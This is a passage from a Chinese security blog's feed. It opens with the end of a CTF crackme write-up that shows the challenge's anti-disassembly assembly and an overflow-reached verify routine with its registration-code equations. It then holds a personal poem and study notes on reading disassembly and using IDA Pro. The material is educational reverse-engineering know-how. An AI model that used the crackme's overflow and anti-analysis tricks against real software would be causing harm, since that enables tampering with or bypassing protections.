Fpc.\n\n&quot;);</span><br><span class="line">    printf(&quot; Please input your code: &quot;);</span><br><span class="line">    scanf(&quot;%s&quot;, Key);</span><br><span class="line">    return p2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="两个fake函数-asm"><a href="#两个fake函数-asm" class="headerlink" title="两个fake函数(asm)"></a>两个fake函数(asm)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __declspec(naked) very1()                                              // useless</span><br><span class="line">&#123;</span><br><span class="line">    long int x, y, z;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        push    ebp</span><br><span class="line">        mov     ebp, esp</span><br><span class="line">        //mov       eax, esp</span><br><span class="line">        //sub       eax, 8</span><br><span class="line">        //mov       edx, [eax]</span><br><span class="line">        //mov       [ebp-4], edx</span><br><span class="line">        //mov       edx, [eax+4]</span><br><span class="line">        //mov       [ebp-8], edx</span><br><span class="line">        mov     ecx, [ebp-4]</span><br><span class="line">        test        ecx, ecx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     edx, [ebp-8]</span><br><span class="line">        test        edx, edx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     eax, ecx</span><br><span class="line">        sub     eax, edx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     [ebp-0x0c], eax</span><br><span class="line">        imul        eax,  5</span><br><span class="line">        add     ecx, eax</span><br><span class="line">        cmp     ecx, 0x08f503a42</span><br><span class="line">        jnz     end1</span><br><span class="line">        mov     eax, [ebp-0x0c]</span><br><span class="line">        imul        eax, 13</span><br><span class="line">        add     edx, eax</span><br><span class="line">        cmp     edx, 0x0ef503a42</span><br><span class="line">        jnz     end1</span><br><span class="line">        mov     edx, 0x543f30                               // dec flag, anti ida x-ref trick</span><br><span class="line">        xor     edx, 0x158f04</span><br><span class="line">        mov     eax, [edx]</span><br><span class="line">        dec     eax</span><br><span class="line">        mov     [edx], eax</span><br><span class="line">        //mov       cFlag, eax</span><br><span class="line">    //if (x==0)</span><br><span class="line">    //  goto end1;</span><br><span class="line">    //if (y==0)</span><br><span class="line">    //  goto end1;</span><br><span class="line">    //z=x-y;</span><br><span class="line">    //if (z==0)</span><br><span class="line">    //      goto end1;</span><br><span class="line">    //if( ((x+z*5)==0x08f503a42) &amp;&amp; ((y+z*13)==0x0ef503a42) )</span><br><span class="line">    //  G();</span><br><span class="line">end1:</span><br><span class="line">        mov     esp, ebp</span><br><span class="line">        pop     ebp</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">    //return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __declspec(naked) very3()                                              // useless</span><br><span class="line">&#123;</span><br><span class="line">    long int x, y, z;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        push    ebp</span><br><span class="line">        mov     ebp, esp</span><br><span class="line">        mov     ecx, [ebp-4]</span><br><span class="line">        test        ecx, ecx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     edx, [ebp-8]</span><br><span class="line">        test        edx, edx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     eax, ecx</span><br><span class="line">        sub     eax, edx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     [ebp-0x0c], eax</span><br><span class="line">        imul        eax,  17</span><br><span class="line">        add     ecx, eax</span><br><span class="line">        cmp     ecx, 0x0f3a94883</span><br><span class="line">        jnz     end1</span><br><span class="line">        mov     eax, [ebp-0x0c]</span><br><span class="line">        imul        eax, 7</span><br><span class="line">        add     edx, eax</span><br><span class="line">        cmp     edx, 0x033a94883</span><br><span class="line">        jnz     end1</span><br><span class="line">        mov     edx, 0x543f30</span><br><span class="line">        xor     edx, 0x158f04</span><br><span class="line">        mov     eax, [edx]</span><br><span class="line">        dec     eax</span><br><span class="line">        mov     [edx], eax</span><br><span class="line">end1:</span><br><span class="line">        mov     esp, ebp</span><br><span class="line">        pop     ebp</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="验证部分-masm"><a href="#验证部分-masm" class="headerlink" title="验证部分(masm)"></a>验证部分(masm)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public  c very2     ;声明引出的proc</span><br><span class="line"> </span><br><span class="line">extern  cFlag:near</span><br><span class="line"> </span><br><span class="line">.code</span><br><span class="line">    db 10000 dup(0)             ; pushing addr of very2 to 413131 in exe-file</span><br><span class="line">    db 2000h  dup(0)</span><br><span class="line"> </span><br><span class="line">    db 0c3                  ; ret, give some sign for crackerz</span><br><span class="line">                        ;</span><br><span class="line">very2   proc    near c              ; right verify proc here, at 413131</span><br><span class="line">    add esp, -10                ; restore esp, crack must input:0c bytes regcode and addr of very2</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov DWORD ptr cFlag, eax</span><br><span class="line">    ;</span><br><span class="line">    ; check register code</span><br><span class="line">    ; correct register code at stack:</span><br><span class="line">    ;       Just_for_fun + 11A(addr of very2)</span><br><span class="line">    ;</span><br><span class="line">    ;解个三元一次方程</span><br><span class="line">    ;5x-4y+z=A</span><br><span class="line">    ;4x-3y+z=B</span><br><span class="line">    ;4x-3y-z=C</span><br><span class="line">    ;</span><br><span class="line">    pop eax</span><br><span class="line">    mov ecx, eax        ;eax=x      7473754a</span><br><span class="line">    pop eax         ;eax=y      726f6630</span><br><span class="line">    mov ebx, eax</span><br><span class="line">    pop eax         ;z      6e756630</span><br><span class="line">    mov edx, eax</span><br><span class="line">    mov eax, ecx        ;x</span><br><span class="line">    sub eax, ebx        ;x-y        2040f1a</span><br><span class="line">    shl eax, 2      ;4(x-y)     8103c68</span><br><span class="line">    add eax, ecx        ;x=x+4(x-y) 7c83b1b2</span><br><span class="line">    add eax, edx        ;x=x+4(x-y)+z   eaf917e2</span><br><span class="line">    sub eax, 0eaf917e2  ;A</span><br><span class="line">    jnz bad_boy</span><br><span class="line">    add eax, ecx</span><br><span class="line">    sub eax, ebx        ;x-y</span><br><span class="line">    mov ebx, eax</span><br><span class="line">    shl eax, 1</span><br><span class="line">    add eax, ebx        ;3(x-y)     60c2d4e</span><br><span class="line">    add eax, ecx        ;x+3(x-y)</span><br><span class="line">    mov ecx, eax        ;x+3(x-y)   7a7fa298</span><br><span class="line">    add eax, edx        ;x+3(x-y)+z e8f508c8</span><br><span class="line">    sub eax, 0e8f508c8  ;B</span><br><span class="line">    jnz bad_boy</span><br><span class="line">    mov eax, ecx</span><br><span class="line">    sub eax, edx        ;x+3(x-y)-z c0a3c68</span><br><span class="line">    sub eax, 0c0a3c68   ;C</span><br><span class="line">    jnz bad_boy</span><br><span class="line">    ;</span><br><span class="line">    ;eax=0</span><br><span class="line">    ;ebx=02040f1a</span><br><span class="line">    ;ecx=7a7fa298</span><br><span class="line">    ;edx=6e756630</span><br><span class="line">    pop eax         ; balance stack, eax=413131</span><br><span class="line">    ;set flag to 0, show good cracker msg</span><br><span class="line">    xor eax, 8101       ;eax=41b030, addr of flag</span><br><span class="line">    mov edi, eax</span><br><span class="line">    xor eax, eax</span><br><span class="line">    stosd           ;set flag</span><br><span class="line">    call @f</span><br><span class="line">    ;buffer for good message: &quot;You get it!&quot;, in 3 dwords</span><br><span class="line">    dd 0050600e8, 1702,1702</span><br><span class="line">@@:</span><br><span class="line">    ; recover good message in code segment</span><br><span class="line">    pop eax</span><br><span class="line">    push eax</span><br><span class="line">    mov edi, eax</span><br><span class="line">    ;push 20756f59</span><br><span class="line">    push 4e000969           ;first dword</span><br><span class="line">    pop eax</span><br><span class="line">    ;use ebx,edx value</span><br><span class="line">    xor eax, edx</span><br><span class="line">    stosd</span><br><span class="line">    ;push 20746567</span><br><span class="line">    xor eax, 10a3e          ;second dword</span><br><span class="line">    stosd</span><br><span class="line">    ;push 217469</span><br><span class="line">    xor eax, ebx            ;22706b8c, third dword</span><br><span class="line">    xor eax, 22511e14</span><br><span class="line">    stosd</span><br><span class="line">    ;mov eax, 401044</span><br><span class="line">    xor eax, 61642d</span><br><span class="line">    jmp ret1</span><br><span class="line">bad_boy:</span><br><span class="line">    ;mov eax, 40103f</span><br><span class="line">    pop eax         ;eax=413131, addr of very2</span><br><span class="line">    xor eax, 1210e</span><br><span class="line">ret1:</span><br><span class="line">    xor eax, DWORD ptr cFlag</span><br><span class="line">    jmp eax</span><br><span class="line">    nop</span><br><span class="line">    ;ret</span><br><span class="line"> </span><br><span class="line">very2   endp</span><br></pre></td></tr></table></figure><hr><p>完结</p><p>From <a href="https://kabeor.github.io/看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc/">https://kabeor.github.io/看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;看雪-TSRC-2017CTF秋季赛-ctf2017-Fpc&quot;&gt;&lt;a href=&quot;#看雪-TSRC-2017CTF秋季赛-ctf2017-Fpc&quot; class=&quot;headerlink&quot; title=&quot;看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc&quot;&gt;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向，缓冲区溢出" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>Miss You</title>
    <link href="https://kabeor.github.io/Miss%20You/"/>
    <id>https://kabeor.github.io/Miss You/</id>
    <published>2018-04-22T11:30:52.362Z</published>
    <updated>2018-06-07T11:12:28.769Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Miss-You"><a href="#Miss-You" class="headerlink" title="Miss You"></a>Miss You</h1><hr><blockquote><p>思念你的眼眸，是从那一刻<br>悄然开始的</p><p>情不知所起，一往而深</p><p>清风湿润，茶烟轻扬<br>汝携芳华，踏入吾梦<br>一花一草，一木一字<br>满天星辰，何不是你</p><p>思念一重一重<br>点缀万家灯火<br>眷恋一天一天<br>跨过寒暑昏昼</p><p>It ‘s sweet of that sugar<br>Cherish every second spend with you<br>Don’t doubt<br>That’s how you make me feel</p><p>Everybody knows I love you bady</p><p>The faster time passes, the more I miss you</p></blockquote><hr><p>为七天前的你写下这段话</p><p>2018/4/22 19:31:16 </p><p>From <a href="https://kabeor.github.io/Miss You/">https://kabeor.github.io/Miss You/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Miss-You&quot;&gt;&lt;a href=&quot;#Miss-You&quot; class=&quot;headerlink&quot; title=&quot;Miss You&quot;&gt;&lt;/a&gt;Miss You&lt;/h1&gt;&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;思念你的眼眸，是从那一刻&lt;br&gt;悄然开始的&lt;/p&gt;
&lt;p
      
    
    </summary>
    
    
      <category term="You" scheme="https://kabeor.github.io/tags/You/"/>
    
  </entry>
  
  <entry>
    <title>第6章 识别汇编中的C代码结构</title>
    <link href="https://kabeor.github.io/%E7%AC%AC6%E7%AB%A0%20%E8%AF%86%E5%88%AB%E6%B1%87%E7%BC%96%E4%B8%AD%E7%9A%84C%E4%BB%A3%E7%A0%81%E7%BB%93%E6%9E%84/"/>
    <id>https://kabeor.github.io/第6章 识别汇编中的C代码结构/</id>
    <published>2018-04-11T12:54:08.643Z</published>
    <updated>2018-06-07T11:14:06.921Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第6章-识别汇编中的C代码结构"><a href="#第6章-识别汇编中的C代码结构" class="headerlink" title="第6章 识别汇编中的C代码结构"></a>第6章 识别汇编中的C代码结构</h1><h2 id="6x1-全局与局部变量"><a href="#6x1-全局与局部变量" class="headerlink" title="6x1 全局与局部变量"></a>6x1 全局与局部变量</h2><blockquote><p>全局变量可以被一个程序中的任意函数访问和使用<br>局部变量只能在它被定义的函数中访问</p></blockquote><p>在反汇编代码中： </p><p><strong>全局变量通过内存地址引用</strong><br><strong>局部变量通过栈地址引用</strong></p><h2 id="6x2-反汇编算术操作"><a href="#6x2-反汇编算术操作" class="headerlink" title="6x2 反汇编算术操作"></a>6x2 反汇编算术操作</h2><blockquote><p><strong>C代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180411/Em0JbH1KjE.png?imageslim" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180411/jJFIHbK09B.png?imageslim" alt="mark"></p></blockquote><p>反汇编中，1~2行为赋值，3~5行为a=a+11，6~9行为a=a-b，10~12和13~15分别为a–和b++，16~19为b=a%3</p><h2 id="6x3-识别if语句"><a href="#6x3-识别if语句" class="headerlink" title="6x3 识别if语句"></a>6x3 识别if语句</h2><blockquote><p><strong>C代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180411/BCBEg9A1F8.png?imageslim" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180411/24gjge4Kig.png?imageslim" alt="mark"></p></blockquote><p>cmp比较var_4是否等于var_8</p><h3 id="1-用IDA-Pro图形化分析函数"><a href="#1-用IDA-Pro图形化分析函数" class="headerlink" title="1. 用IDA Pro图形化分析函数"></a>1. 用IDA Pro图形化分析函数</h3><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180411/3g43Kchl3f.png?imageslim" alt="mark"></p><h3 id="2-识别嵌套的if语句"><a href="#2-识别嵌套的if语句" class="headerlink" title="2. 识别嵌套的if语句"></a>2. 识别嵌套的if语句</h3><blockquote><p><strong>C代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180411/0CbEEILdE5.png?imageslim" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180411/aK1cACD9E8.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180411/i7FL27hgf3.png?imageslim" alt="mark"></p></blockquote><h2 id="6x4-识别循环"><a href="#6x4-识别循环" class="headerlink" title="6x4 识别循环"></a>6x4 识别循环</h2><h3 id="1-找到for循环"><a href="#1-找到for循环" class="headerlink" title="1. 找到for循环"></a>1. 找到for循环</h3><blockquote><p><strong>C代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/4bCgH8b1Hb.png?imageslim" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/8798jf4B1F.png?imageslim" alt="mark"></p><p><strong>IDA Pro图形化</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/5JfIlhG8hJ.png?imageslim" alt="mark"></p></blockquote><p>汇编代码中，for循环可通过以下4个组件识别出来</p><blockquote><p>初始化<br>比较<br>执行指令<br>递增/递减</p></blockquote><h3 id="2-找到while循环"><a href="#2-找到while循环" class="headerlink" title="2. 找到while循环"></a>2. 找到while循环</h3><blockquote><p><strong>C代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/lGg3me2CEg.png?imageslim" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/IiC7lddDd5.png?imageslim" alt="mark"></p></blockquote><p>汇编代码和for循环非常相似，唯一区别在于它缺少一个递增</p><h2 id="6x5-理解函数调用约定"><a href="#6x5-理解函数调用约定" class="headerlink" title="6x5 理解函数调用约定"></a>6x5 理解函数调用约定</h2><blockquote><p><strong>一个函数调用的伪代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/Ad8dkK1bFB.png?imageslim" alt="mark"></p></blockquote><p>最常见的三个调用约定：cdecl，stdcall，fastcall</p><h3 id="1-cdecl"><a href="#1-cdecl" class="headerlink" title="1. cdecl"></a>1. cdecl</h3><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/4gh8Lck097.png?imageslim" alt="mark"></p><p>在cdecl约定中，参数从右到左按序被压入栈，当函数完成时由调用者清理栈。</p><h3 id="2-stdcall"><a href="#2-stdcall" class="headerlink" title="2. stdcall"></a>2. stdcall</h3><p>stdcall是Windows API的标准调用约定。任何调用这些API的代码都不需要清理栈，清理栈由实现API函数代码的DLL程序所承担</p><h3 id="3-fastcall"><a href="#3-fastcall" class="headerlink" title="3. fastcall"></a>3. fastcall</h3><p>在fastcall中，前面的一些参数被传到寄存器，备用的寄存器是EDX和ECX。如果需要，剩下的参数再以从右到左的次序被加载到栈上。<br>使用fastcall比其他约定更高效，因为代码不需要涉及过多的栈操作</p><h3 id="4-压栈与移动"><a href="#4-压栈与移动" class="headerlink" title="4. 压栈与移动"></a>4. 压栈与移动</h3><blockquote><p><strong>C代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/l045lDl8Ha.png?imageslim" alt="mark"></p><p><strong>adder函数汇编代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/AeFE94dA40.png?imageslim" alt="mark"></p><p><strong>使用两种不同调用约定时一个函数调用的汇编代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/Ek3A8dkmK2.png?imageslim" alt="mark"></p></blockquote><h2 id="6x6-分析switch语句"><a href="#6x6-分析switch语句" class="headerlink" title="6x6 分析switch语句"></a>6x6 分析switch语句</h2><p>switch语句通常以两种方式被编译：</p><ol><li>if样式</li><li>跳转表</li></ol><h3 id="1-if样式"><a href="#1-if样式" class="headerlink" title="1. if样式"></a>1. if样式</h3><blockquote><p><strong>C代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/1c882H4a66.png?imageslim" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/LBeKLB5IBj.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/IiGe6bBca1.png?imageslim" alt="mark"></p><p><strong>IDA Pro图形化</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/F523hi1Dj2.png?imageslim" alt="mark"></p></blockquote><h3 id="2-跳转表"><a href="#2-跳转表" class="headerlink" title="2. 跳转表"></a>2. 跳转表</h3><blockquote><p><strong>C代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/5iB0bd63bK.png?imageslim" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/BdKhFgAE4l.png?imageslim" alt="mark"></p><p><strong>IDA Pro图形化</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/6IfmgkH8mA.png?imageslim" alt="mark"></p></blockquote><h2 id="6x7-反汇编数组"><a href="#6x7-反汇编数组" class="headerlink" title="6x7 反汇编数组"></a>6x7 反汇编数组</h2><blockquote><p><strong>C代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/D7A98hiJj0.png?imageslim" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/clbGg8GBlj.png?imageslim" alt="mark"></p></blockquote><p>数组a的基地址对应var_14，数组b的基地址对应dword_40A000.</p><p>ecx被作为索引使用，它被乘以4，来指明元素的大小，结果值与数组的基地址相加，来访问正确的数组元素。</p><h2 id="6x8-识别结构体"><a href="#6x8-识别结构体" class="headerlink" title="6x8 识别结构体"></a>6x8 识别结构体</h2><blockquote><p><strong>C代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/CB6861K6Im.png?imageslim" alt="mark"></p><p><strong>main函数反汇编代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/HihGf9EeI9.png?imageslim" alt="mark"></p><p><strong>test函数反汇编代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/1E08eEELh5.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/lLGj4LC3cC.png?imageslim" alt="mark"></p></blockquote><p>arg_0是这个结构体的基地址，偏移0x14保存了结构中的字符，并且0x61对应ASCII中的字母a</p><h2 id="6x9-分析链表遍历"><a href="#6x9-分析链表遍历" class="headerlink" title="6x9 分析链表遍历"></a>6x9 分析链表遍历</h2><blockquote><p><strong>C代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/JehDlJ7iKh.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/92JDcbk51a.png?imageslim" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/gd5KF51E7k.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180412/168GGcgFfK.png?imageslim" alt="mark"></p></blockquote><p>var_C对应i，它是这个循环的计数。<br>var_8对应head变量。<br>var_4是一个指向拥有两个被赋值变量结构体的指针</p><p>From <a href="https://kabeor.github.io/第6章 识别汇编中的C代码结构/">https://kabeor.github.io/第6章 识别汇编中的C代码结构/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第6章-识别汇编中的C代码结构&quot;&gt;&lt;a href=&quot;#第6章-识别汇编中的C代码结构&quot; class=&quot;headerlink&quot; title=&quot;第6章 识别汇编中的C代码结构&quot;&gt;&lt;/a&gt;第6章 识别汇编中的C代码结构&lt;/h1&gt;&lt;h2 id=&quot;6x1-全局与局部变量&quot;&gt;
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第二篇 静态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%8C%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第5章 IDA Pro</title>
    <link href="https://kabeor.github.io/%E7%AC%AC5%E7%AB%A0%20IDA%20Pro/"/>
    <id>https://kabeor.github.io/第5章 IDA Pro/</id>
    <published>2018-04-01T11:00:07.280Z</published>
    <updated>2018-06-07T11:14:47.820Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第5章-IDA-Pro"><a href="#第5章-IDA-Pro" class="headerlink" title="第5章 IDA Pro"></a>第5章 IDA Pro</h1><p>本章介绍了IDA Pro的使用方法，本文就只大致记录常用功能</p><h2 id="5x1-加载一个可执行文件"><a href="#5x1-加载一个可执行文件" class="headerlink" title="5x1 加载一个可执行文件"></a>5x1 加载一个可执行文件</h2><p>默认情况下，IDA Pro反汇编代码中不包含PE头或资源节，这些地方常被恶意代码用来隐藏恶意指令，我们可以指定手动加载</p><h2 id="5x2-IDA-Pro接口"><a href="#5x2-IDA-Pro接口" class="headerlink" title="5x2 IDA Pro接口"></a>5x2 IDA Pro接口</h2><h3 id="1-反汇编窗口模式"><a href="#1-反汇编窗口模式" class="headerlink" title="1. 反汇编窗口模式"></a>1. 反汇编窗口模式</h3><blockquote><p>图形模式</p></blockquote><p>显示行号的操作码：Options-&gt;General，选择Line prefixes并设置Number of Opcode Bytes为6.（如果这些设置让所有指令都在屏幕右对齐，尝试设置Instruction Indentation为8）</p><p>箭头颜色：</p><ol><li>红色：一个条件跳转没有被采用</li><li>绿色：这个条件跳转被采用</li><li>蓝色：一个无条件跳转被采用</li></ol><blockquote><p>文本模式</p></blockquote><p>打开自动注释： Options-&gt;General，选择Auto comments</p><h3 id="2-对分析有用的窗口"><a href="#2-对分析有用的窗口" class="headerlink" title="2. 对分析有用的窗口"></a>2. 对分析有用的窗口</h3><blockquote><p>函数窗口<br>名字窗口<br>字符串窗口<br>导入表窗口<br>导入表窗口<br>结构窗口</p></blockquote><h3 id="3-返回到默认窗口"><a href="#3-返回到默认窗口" class="headerlink" title="3. 返回到默认窗口"></a>3. 返回到默认窗口</h3><p>Windows-&gt;Reset Desktop<br>Windows-&gt;Save desktop   保存新视图</p><h3 id="4-导航IDA-Pro"><a href="#4-导航IDA-Pro" class="headerlink" title="4. 导航IDA Pro"></a>4. 导航IDA Pro</h3><blockquote><p>使用链接和交叉引用<br>浏览历史<br>导航栏</p><pre><code>1. 浅蓝色： 被FLIRT识别的库代码2. 红色： 编译器生成的代码3. 深蓝色： 用户编写的代码4. 粉红色： 导入的数据5. 灰色： 已定义的数据6. 棕色： 未定义的数据</code></pre><p>跳转到位置   <strong>G</strong></p></blockquote><h3 id="5-搜索"><a href="#5-搜索" class="headerlink" title="5. 搜索"></a>5. 搜索</h3><blockquote><p>Search-&gt;Next Code  移动光标到包含你所指定的指令的下一个位置<br>Search-&gt;Text  在整个反汇编窗口中搜索一个指定的字符串<br>Search-&gt;Sequence of Bytes  在十六进制视图窗口中对一个特定字节序列执行二进制搜索</p></blockquote><h2 id="5x3-使用交叉引用"><a href="#5x3-使用交叉引用" class="headerlink" title="5x3 使用交叉引用"></a>5x3 使用交叉引用</h2><p>交叉引用（xref）<br>查看一个函数的所有交叉引用：单机函数名并按X键</p><h2 id="5x4-分析函数"><a href="#5x4-分析函数" class="headerlink" title="5x4 分析函数"></a>5x4 分析函数</h2><p>创建函数：  P<br>无法识别出基于EBP的一个栈帧的修复： 按Alt+P，选择BP Based Frame，然后指定4 bytes for Saved Registers</p><h2 id="5x5-使用图形选项"><a href="#5x5-使用图形选项" class="headerlink" title="5x5 使用图形选项"></a>5x5 使用图形选项</h2><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180401/7aahD3bGhK.png?imageslim" alt="mark"></p><h2 id="5x6-增强反汇编"><a href="#5x6-增强反汇编" class="headerlink" title="5x6 增强反汇编"></a>5x6 增强反汇编</h2><p>IDA Pro没有撤销</p><ol><li>重命名</li><li>注释：将光标放在反汇编的某行上，并按冒号（:）</li><li>格式化操作数</li><li>使用命名的常量—-手动加载有关类型库：选择View-&gt;Open Subviews-&gt;Type Libraries</li><li>重新定义代码和数据<ol><li>按U取消函数，代码或数据的定义</li><li>按C定义原始字节为代码</li><li>按D定义原始字节为数据</li><li>按A定义原始字节为ASCII字符串</li></ol></li></ol><h2 id="5x7-用插件扩展IDA"><a href="#5x7-用插件扩展IDA" class="headerlink" title="5x7 用插件扩展IDA"></a>5x7 用插件扩展IDA</h2><h3 id="1-IDC脚本"><a href="#1-IDC脚本" class="headerlink" title="1. IDC脚本"></a>1. IDC脚本</h3><p>File-&gt;Script File   简单运行<br>File-&gt;IDC Command  作为单独命令运行</p><h3 id="2-IDAPython"><a href="#2-IDAPython" class="headerlink" title="2. IDAPython"></a>2. IDAPython</h3><h3 id="3-使用商业插件"><a href="#3-使用商业插件" class="headerlink" title="3. 使用商业插件"></a>3. 使用商业插件</h3><p>Hex-Rays生成伪代码<br>zynamics BinDiff比较两个IDA Pro数据库</p><p>From <a href="https://kabeor.github.io/第5章 IDA Pro/">https://kabeor.github.io/第5章 IDA Pro/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第5章-IDA-Pro&quot;&gt;&lt;a href=&quot;#第5章-IDA-Pro&quot; class=&quot;headerlink&quot; title=&quot;第5章 IDA Pro&quot;&gt;&lt;/a&gt;第5章 IDA Pro&lt;/h1&gt;&lt;p&gt;本章介绍了IDA Pro的使用方法，本文就只大致记录常用功能&lt;/p&gt;
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第二篇 静态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%8C%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>对强网杯2018“Web签到”的思考</title>
